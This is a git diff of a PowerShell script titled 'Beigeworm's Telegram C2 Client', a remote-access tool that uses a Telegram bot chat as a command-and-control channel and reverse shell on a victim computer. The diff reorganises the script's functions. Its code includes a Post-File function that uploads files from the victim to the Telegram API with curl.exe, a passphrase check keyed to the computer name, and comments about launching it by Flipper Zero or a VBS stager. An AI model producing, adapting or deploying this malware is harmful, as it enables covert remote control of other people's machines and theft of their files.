@@ -1,5 +1,4 @@
-<#
-============================================= Beigeworm's Telegram C2 Client ========================================================
+<# ============================================= Beigeworm's Telegram C2 Client ========================================================
 
 SYNOPSIS
 Using a Telegram Bot's Chat to Act as a Command and Control Platform.
@@ -9,9 +8,8 @@ This script will wait until it is called in chat by the computer name to take co
 A list of Modules can be accessed by typing 'options' in chat, or you can use the chat to act simply as a reverse shell.
 
 SEE README FOR MORE INFO
-
 #>
-#---------------------------------------------- SCRIPT SETUP -----------------------------------------------
+# ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define Connection Variables
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
@@ -43,14 +41,6 @@ $scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $Mts = New-Object psobject 
 $Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
 
-Function Post-Message{
-    $script:params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-    }
-
-# Message waiting for passphrase
-$contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
-Post-Message
 #----------------------------------------------- COMMANDS / FUNCTIONS ----------------------------------------------
 
 Function Options{
@@ -510,6 +500,10 @@ Function Enable-HID{
 
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
+# Posting Functions
+Function Post-Message{$script:params = @{chat_id = $ChatID ;text = $contents};Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params}
+Function Post-File{curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null}
+
 Function ShowButtons{
 $messagehead = "Press a Button to Continue..."
 $inlineKeyboardJson = '{"inline_keyboard":[[{"text": "Enter Commands","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
@@ -522,24 +516,16 @@ while ($killint -eq 0) {
     foreach ($update in $updates.result) {
         $offset = $update.update_id + 1
         Sleep 1
-        if ($update.callback_query.data -eq "button_clicked") {
-            $killint = 1
+        if ($update.callback_query.data -eq "button_clicked") {$killint = 1}
+        if ($update.callback_query.data -eq "button2_clicked") {$killint = 1;Options}
         }
-        if ($update.callback_query.data -eq "button2_clicked") {
-            $killint = 1
-            Options
-        }
-    }
     Sleep 1
-}
+    }
 $contents = "$comp $env:COMPUTERNAME $tick Session Started"
 Post-Message
 }
 
-Function Post-File{
-    curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-}
-
+# Session Authentication
 Function IsAuth{ 
 param($CheckMessage)
     if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
@@ -551,6 +537,7 @@ param($CheckMessage)
     }Else{return 0}
 }
 
+# format long strings
 Function CleanString{
 param($Stream)
 $FixedResult=@()
@@ -564,6 +551,7 @@ $ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgc2.txt") | wh
 return $FixedResult
 }
 
+# Message Interpretation
 Function SendMSG{
 param($Messagetext,$ChatID)
 $FixedText=CleanString -Stream $Messagetext
@@ -583,6 +571,11 @@ Catch{return "Telegram C2 Failed"}
 
 #-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------
 
+# Message 'waiting for passphrase'
+$contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
+Post-Message
+
+# Start the main wait loop.
 While ($true){
 Sleep 2
 $messages=ReceiveMSG
